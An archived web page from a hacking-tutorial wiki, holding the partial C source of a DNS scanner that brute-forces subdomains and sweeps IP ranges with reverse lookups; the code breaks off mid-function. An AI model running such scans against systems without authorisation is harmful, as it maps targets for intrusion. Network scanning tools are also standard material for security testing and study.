http://www.blackhatlibrary.net/Dripper.c
HTTP/1.1 200 OK
Server: cloudflare-nginx
Date: Wed, 23 Jul 2014 05:57:09 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: __cfduid=d5a106cbfc7a9db9c6bf687ca607e64b41406095026336; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
X-Powered-By: PHP/5.4.15
Content-language: en
Vary: Accept-Encoding, Cookie
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: private, must-revalidate, max-age=0
CF-RAY: 14e5a37a9711087a-IAD
Content-Encoding: gzip

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Dripper.c - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
<meta name="generator" content="MediaWiki" />
<meta name="og:title" content="Dripper.c" />
<meta name="og:type" content="article" />
<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
<link rel="shortcut icon" href="/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
<style type="text/css">/*<![CDATA[*/
.source-c {line-height: normal;}
.source-c li, .source-c pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for c
 * CSS class: source-c, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.c.source-c .de1, .c.source-c .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
.c.source-c  {font-family:monospace;}
.c.source-c .imp {font-weight: bold; color: red;}
.c.source-c li, .c.source-c .li1 {font-weight: normal; vertical-align:top;}
.c.source-c .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.c.source-c .li2 {font-weight: bold; vertical-align:top;}
.c.source-c .kw1 {color: #b1b100;}
.c.source-c .kw2 {color: #000000; font-weight: bold;}
.c.source-c .kw3 {color: #000066;}
.c.source-c .kw4 {color: #993333;}
.c.source-c .co1 {color: #666666; font-style: italic;}
.c.source-c .co2 {color: #339933;}
.c.source-c .coMULTI {color: #808080; font-style: italic;}
.c.source-c .es0 {color: #000099; font-weight: bold;}
.c.source-c .es1 {color: #000099; font-weight: bold;}
.c.source-c .es2 {color: #660099; font-weight: bold;}
.c.source-c .es3 {color: #660099; font-weight: bold;}
.c.source-c .es4 {color: #660099; font-weight: bold;}
.c.source-c .es5 {color: #006699; font-weight: bold;}
.c.source-c .br0 {color: #009900;}
.c.source-c .sy0 {color: #339933;}
.c.source-c .st0 {color: #ff0000;}
.c.source-c .nu0 {color: #0000dd;}
.c.source-c .nu6 {color: #208080;}
.c.source-c .nu8 {color: #208080;}
.c.source-c .nu12 {color: #208080;}
.c.source-c .nu16 {color:#800080;}
.c.source-c .nu17 {color:#800080;}
.c.source-c .nu18 {color:#800080;}
.c.source-c .nu19 {color:#800080;}
.c.source-c .me1 {color: #202020;}
.c.source-c .me2 {color: #202020;}
.c.source-c .ln-xtra, .c.source-c li.ln-xtra, .c.source-c div.ln-xtra {background-color: #ffc;}
.c.source-c span.xtra { display:block; }

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
/*]]>*/
</style></head>
<body class="mediawiki ltr ns-0 ns-subject page-Dripper_c skin-monobook">
<div id="globalWrapper">
<div id="column-content"><div id="content">
	<a id="top"></a>
	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
google_ad_slot = "3567986077";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>
	<h1 id="firstHeading" class="firstHeading">Dripper.c</h1>
	<div id="bodyContent">
		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
		<div id="contentSub"></div>
		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
		<!-- start content -->
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="c source-c"><pre class="de1"><span class="coMULTI">/*
* Stateless DNS Scanner -- dripper.c
* (C) 2013 jtripper
*
* This program is free software; you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation; either version 1, or (at your option)
* any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program; if not, write to the Free Software
* Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/</span>
<span class="co2">#include &lt;arpa/inet.h&gt;</span>
<span class="co2">#include &lt;errno.h&gt;</span>
<span class="co2">#include &lt;netinet/ip.h&gt;</span>
<span class="co2">#include &lt;netinet/udp.h&gt;</span>
<span class="co2">#include &lt;regex.h&gt;</span>
<span class="co2">#include &lt;stdarg.h&gt;</span>
<span class="co2">#include &lt;stdio.h&gt;</span>
<span class="co2">#include &lt;stdlib.h&gt;</span>
<span class="co2">#include &lt;string.h&gt;</span>
<span class="co2">#include &lt;sys/socket.h&gt;</span>
<span class="co2">#include &lt;unistd.h&gt;</span>
&#160;
in_addr_t <span class="sy0">*</span>dns_servers<span class="sy0">;</span>
<span class="kw4">int</span>   NUM_DNS    <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw4">char</span> <span class="sy0">*</span>RESOLVCONF <span class="sy0">=</span> <span class="st0">&quot;resolv.conf&quot;</span><span class="sy0">;</span>
<span class="kw4">char</span> <span class="sy0">*</span>SUBDOMAINS <span class="sy0">=</span> <span class="st0">&quot;subs.txt&quot;</span><span class="sy0">;</span>
&#160;
<span class="co1">// structs for the DNS protocol</span>
<span class="kw4">struct</span> dnsflags <span class="br0">&#123;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> rd<span class="sy0">:</span><span class="nu0">1</span><span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> tc<span class="sy0">:</span><span class="nu0">1</span><span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> aa<span class="sy0">:</span><span class="nu0">1</span><span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> opcode<span class="sy0">:</span><span class="nu0">4</span><span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> qr<span class="sy0">:</span><span class="nu0">1</span><span class="sy0">;</span>
&#160;
  <span class="kw4">unsigned</span> <span class="kw4">short</span> rcode<span class="sy0">:</span><span class="nu0">4</span><span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> z<span class="sy0">:</span><span class="nu0">3</span><span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> ra<span class="sy0">:</span><span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span>
&#160;
<span class="kw4">struct</span> dnshdr <span class="br0">&#123;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> txid<span class="sy0">;</span>
  <span class="kw4">struct</span> dnsflags dns_flags<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> questions<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> answer_rrs<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> authority_rrs<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> additional_rrs<span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span>
&#160;
<span class="kw4">struct</span> dnstype <span class="br0">&#123;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> type<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> class<span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span>
&#160;
<span class="kw4">struct</span> dnsanswer <span class="br0">&#123;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> name<span class="sy0">;</span>
  <span class="kw4">struct</span> dnstype qtype<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> pad<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> ttl<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">short</span> len<span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span>
&#160;
<span class="co1">// ipv4_network struct</span>
<span class="kw4">struct</span> ipv4_network <span class="br0">&#123;</span>
  <span class="kw4">unsigned</span> <span class="kw4">long</span> mask<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">long</span> cidr<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">long</span> max<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">long</span> addr<span class="sy0">;</span>
  <span class="kw4">struct</span> in_addr sin_addr<span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span>
&#160;
<span class="kw4">void</span> convert_to_dns<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>dns<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> convert_to_str<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>pkt<span class="sy0">,</span> <span class="kw4">int</span> len<span class="sy0">,</span> <span class="kw4">char</span> <span class="sy0">*</span>max<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> error<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>format<span class="sy0">,</span> ...<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> forward_brute<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>target<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">int</span>  ip_range_init<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>range<span class="sy0">,</span> <span class="kw4">struct</span> ipv4_network <span class="sy0">*</span>network<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">int</span>  ip_range_next<span class="br0">&#40;</span><span class="kw4">struct</span> ipv4_network <span class="sy0">*</span>network<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> parse_dns_reply<span class="br0">&#40;</span><span class="kw4">unsigned</span> <span class="kw4">char</span> <span class="sy0">*</span>pkt<span class="sy0">,</span> <span class="kw4">int</span> len_pkt<span class="sy0">,</span> <span class="kw4">char</span> <span class="sy0">*</span>domain<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> parse_resolv_conf<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> print_hex<span class="br0">&#40;</span><span class="kw4">unsigned</span> <span class="kw4">char</span> <span class="sy0">*</span>pkt<span class="sy0">,</span> <span class="kw4">int</span> len<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> reverse_search<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>range<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> rstrip<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>str<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">int</span>  send_dns<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>target<span class="sy0">,</span> <span class="kw4">int</span> type<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> sniff_dns_replies<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>domain<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw4">void</span> usage<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
<span class="co1">// convert dotted format to domain name format</span>
<span class="co1">// arguments:</span>
<span class="co1">//   dns -&gt; domain name</span>
<span class="kw4">void</span> convert_to_dns<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>dns<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>mark <span class="sy0">=</span> NULL<span class="sy0">;</span>
  <span class="kw4">int</span> i<span class="sy0">,</span> j<span class="sy0">;</span>
&#160;
  <span class="kw1">for</span><span class="br0">&#40;</span>i<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">;</span> i<span class="sy0">&lt;=</span>strlen<span class="br0">&#40;</span>dns<span class="br0">&#41;</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>dns<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">==</span> <span class="st0">'.'</span> <span class="sy0">&amp;&amp;</span> <span class="sy0">!</span>mark<span class="br0">&#41;</span>
      mark <span class="sy0">=</span> <span class="br0">&#40;</span>dns <span class="sy0">+</span> i<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">else</span> <span class="kw1">if</span><span class="br0">&#40;</span>dns<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">==</span> <span class="st0">'.'</span> <span class="sy0">||</span> <span class="br0">&#40;</span>dns<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">==</span> <span class="st0">'<span class="es5">\0</span>'</span> <span class="sy0">&amp;&amp;</span> mark<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      mark<span class="br0">&#91;</span><span class="nu0">0</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span>dns <span class="sy0">+</span> i<span class="br0">&#41;</span> <span class="sy0">-</span> mark <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
      mark <span class="sy0">=</span> <span class="br0">&#40;</span>dns <span class="sy0">+</span> i<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// convert domain name format to regular dotted format</span>
<span class="co1">// arguments:</span>
<span class="co1">//   pkt -&gt; packet</span>
<span class="co1">//   len -&gt; length of domain name (set to 0 if null terminated)</span>
<span class="co1">//   max -&gt; highest offset to go to</span>
<span class="kw4">void</span> convert_to_str<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>pkt<span class="sy0">,</span> <span class="kw4">int</span> len<span class="sy0">,</span> <span class="kw4">char</span> <span class="sy0">*</span>max<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">int</span> i<span class="sy0">,</span> j<span class="sy0">;</span>
&#160;
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="br0">&#40;</span>len <span class="sy0">==</span> <span class="nu0">0</span> <span class="sy0">&amp;&amp;</span> pkt <span class="sy0">+</span> strlen<span class="br0">&#40;</span>pkt<span class="br0">&#41;</span> <span class="sy0">&gt;</span> max<span class="br0">&#41;</span> <span class="sy0">||</span> <span class="br0">&#40;</span>len <span class="sy0">&gt;</span> <span class="nu0">0</span> <span class="sy0">&amp;&amp;</span> pkt <span class="sy0">+</span> len <span class="sy0">&gt;</span> max<span class="br0">&#41;</span><span class="br0">&#41;</span>
    <span class="kw1">return</span><span class="sy0">;</span>
&#160;
  <span class="kw1">for</span><span class="br0">&#40;</span>i<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">;</span> i<span class="sy0">&lt;</span> <span class="br0">&#40;</span>len <span class="sy0">&gt;</span> <span class="nu0">0</span> <span class="sy0">?</span> len <span class="sy0">:</span> strlen<span class="br0">&#40;</span>pkt<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    j <span class="sy0">=</span> pkt<span class="br0">&#91;</span>i<span class="br0">&#93;</span><span class="sy0">;</span>
    pkt<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">=</span> <span class="st0">'.'</span><span class="sy0">;</span>
    i <span class="sy0">+=</span> j<span class="sy0">;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="kw1">if</span><span class="br0">&#40;</span>len <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="br0">&#41;</span>
    pkt<span class="br0">&#91;</span>len<span class="br0">&#93;</span> <span class="sy0">=</span> <span class="st0">'<span class="es5">\0</span>'</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// print an error</span>
<span class="co1">// arguments:</span>
<span class="co1">//   format -&gt; format string</span>
<span class="co1">//   format string arguments</span>
<span class="kw4">void</span> error<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>format<span class="sy0">,</span> ...<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">char</span> error_buffer<span class="br0">&#91;</span><span class="nu0">1024</span><span class="br0">&#93;</span><span class="sy0">;</span>
  va_list args<span class="sy0">;</span>
&#160;
  va_start<span class="br0">&#40;</span>args<span class="sy0">,</span> format<span class="br0">&#41;</span><span class="sy0">;</span>
  vsnprintf<span class="br0">&#40;</span>error_buffer<span class="sy0">,</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span>error_buffer<span class="br0">&#41;</span><span class="sy0">,</span> format<span class="sy0">,</span> args<span class="br0">&#41;</span><span class="sy0">;</span>
  perror<span class="br0">&#40;</span>error_buffer<span class="br0">&#41;</span><span class="sy0">;</span>
  va_end<span class="br0">&#40;</span>args<span class="br0">&#41;</span><span class="sy0">;</span>
  exit<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// bruteforce forward DNS</span>
<span class="co1">// arguments:</span>
<span class="co1">//   target -&gt; domain name to bruteforce</span>
<span class="kw4">void</span> forward_brute<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>target<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">int</span> i<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw4">char</span> record<span class="br0">&#91;</span><span class="nu0">80</span><span class="br0">&#93;</span><span class="sy0">,</span> line<span class="br0">&#91;</span><span class="nu0">80</span><span class="br0">&#93;</span><span class="sy0">;</span>
  FILE <span class="sy0">*</span>f<span class="sy0">;</span>
&#160;
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span><span class="br0">&#40;</span>f <span class="sy0">=</span> fopen<span class="br0">&#40;</span>SUBDOMAINS<span class="sy0">,</span> <span class="st0">&quot;r&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
    error<span class="br0">&#40;</span><span class="st0">&quot;[!] Error opening:&#160;%s&quot;</span><span class="sy0">,</span> SUBDOMAINS<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// loop over file and send requests</span>
  <span class="kw1">while</span> <span class="br0">&#40;</span>fgets<span class="br0">&#40;</span>line<span class="sy0">,</span> <span class="nu0">80</span><span class="sy0">,</span> f<span class="br0">&#41;</span> <span class="sy0">!=</span> NULL<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    memset<span class="br0">&#40;</span>record<span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="nu0">80</span><span class="br0">&#41;</span><span class="sy0">;</span>
    rstrip<span class="br0">&#40;</span>line<span class="br0">&#41;</span><span class="sy0">;</span>
    snprintf<span class="br0">&#40;</span>record<span class="sy0">,</span> <span class="nu0">80</span><span class="sy0">,</span> <span class="st0">&quot;.%s.%s&quot;</span><span class="sy0">,</span> line<span class="sy0">,</span> target<span class="br0">&#41;</span><span class="sy0">;</span>
    send_dns<span class="br0">&#40;</span>record<span class="sy0">,</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
    i<span class="sy0">++;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>i <span class="sy0">==</span> <span class="nu0">1000</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      sleep<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
      i <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
&#160;
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;All domains scanned.<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fclose<span class="br0">&#40;</span>f<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// initialize an ipv4_network structure</span>
<span class="co1">// Arguments:</span>
<span class="co1">//   * range   -&gt; string in CIDR network format (e.g. 192.168.0.1/24)</span>
<span class="co1">//   * network -&gt; pointer to ipv4_network structure</span>
<span class="kw4">int</span> ip_range_init<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>range<span class="sy0">,</span> <span class="kw4">struct</span> ipv4_network <span class="sy0">*</span>network<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>slash<span class="sy0">,</span> tmp_range<span class="br0">&#91;</span><span class="nu0">20</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">long</span> num_addrs<span class="sy0">;</span>
&#160;
  <span class="co1">// copy the range into our own variable</span>
  strncpy<span class="br0">&#40;</span>tmp_range<span class="sy0">,</span> range<span class="sy0">,</span> <span class="nu0">19</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// retreive a pointer to the CIDR value</span>
  <span class="co1">// thanks for pointing this out http://reddit.com/u/abadidea</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span><span class="br0">&#40;</span>slash <span class="sy0">=</span> strchr<span class="br0">&#40;</span>tmp_range<span class="sy0">,</span> <span class="st0">'/'</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;[!] Error, invalid CIDR format.<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    exit<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="co1">// verify that the CIDR converts to an unsigned int &lt; 33</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="br0">&#40;</span>network<span class="sy0">-&gt;</span>cidr <span class="sy0">=</span> atoi<span class="br0">&#40;</span>slash <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="nu0">32</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;[!] Error, invalid CIDR value.<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    exit<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="co1">// convert the slash into a \0</span>
  slash<span class="br0">&#91;</span><span class="nu0">0</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="st0">'<span class="es5">\0</span>'</span><span class="sy0">;</span>
&#160;
  <span class="co1">// convert the IP address into network format</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span>inet_aton<span class="br0">&#40;</span>tmp_range<span class="sy0">,</span> <span class="sy0">&amp;</span>network<span class="sy0">-&gt;</span>sin_addr<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;[!] Error, invalid address.<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    exit<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="co1">// reverse the order of the address</span>
  network<span class="sy0">-&gt;</span>addr <span class="sy0">=</span> ntohl<span class="br0">&#40;</span>network<span class="sy0">-&gt;</span>sin_addr.<span class="me1">s_addr</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="co1">// retrieve the number of addresses</span>
  num_addrs     <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">unsigned</span> <span class="kw4">long</span><span class="br0">&#41;</span><span class="nu12">0xffffffff</span> <span class="sy0">&gt;&gt;</span> network<span class="sy0">-&gt;</span>cidr<span class="sy0">;</span>
  <span class="co1">// get the network mask</span>
  network<span class="sy0">-&gt;</span>mask <span class="sy0">=</span> ~num_addrs<span class="sy0">;</span>
  <span class="co1">// get the first address</span>
  network<span class="sy0">-&gt;</span>addr <span class="sy0">=</span> network<span class="sy0">-&gt;</span>addr <span class="sy0">&amp;</span> network<span class="sy0">-&gt;</span>mask<span class="sy0">;</span>
  <span class="co1">// get the last address</span>
  network<span class="sy0">-&gt;</span>max  <span class="sy0">=</span> network<span class="sy0">-&gt;</span>addr <span class="sy0">+</span> num_addrs<span class="sy0">;</span>
&#160;
  <span class="kw1">return</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// Get the next address in an ipv4_network, returns 0 if there are no more addresses</span>
<span class="co1">// returns 1 if there are still more address.</span>
<span class="co1">// Arguments:</span>
<span class="co1">//   * network -&gt; pointer to an initiaziled ipv4_network struct</span>
<span class="kw4">int</span> ip_range_next<span class="br0">&#40;</span><span class="kw4">struct</span> ipv4_network <span class="sy0">*</span>network<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span><span class="br0">&#40;</span>network<span class="sy0">-&gt;</span>max <span class="sy0">&lt;=</span> network<span class="sy0">-&gt;</span>addr <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">return</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
    network<span class="sy0">-&gt;</span>sin_addr.<span class="me1">s_addr</span> <span class="sy0">=</span> htonl<span class="br0">&#40;</span>network<span class="sy0">-&gt;</span>addr<span class="br0">&#41;</span><span class="sy0">;</span>
    network<span class="sy0">-&gt;</span>addr<span class="sy0">++;</span>
    <span class="kw1">return</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// parse incoming packets</span>
<span class="co1">// arguments:</span>
<span class="co1">//   pkt     -&gt; packet</span>
<span class="co1">//   len_pkt -&gt; packet length</span>
<span class="co1">//   domain  -&gt; only print if domain matches (for PTR records only)</span>
<span class="kw4">void</span> parse_dns_reply<span class="br0">&#40;</span><span class="kw4">unsigned</span> <span class="kw4">char</span> <span class="sy0">*</span>pkt<span class="sy0">,</span> <span class="kw4">int</span> len_pkt<span class="sy0">,</span> <span class="kw4">char</span> <span class="sy0">*</span>domain<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">int</span> length <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">,</span> i<span class="sy0">,</span> to_dns <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>name<span class="sy0">;</span>
  <span class="kw4">struct</span> iphdr  <span class="sy0">*</span>ip_header<span class="sy0">;</span>
  <span class="kw4">struct</span> udphdr <span class="sy0">*</span>udp_header<span class="sy0">;</span>
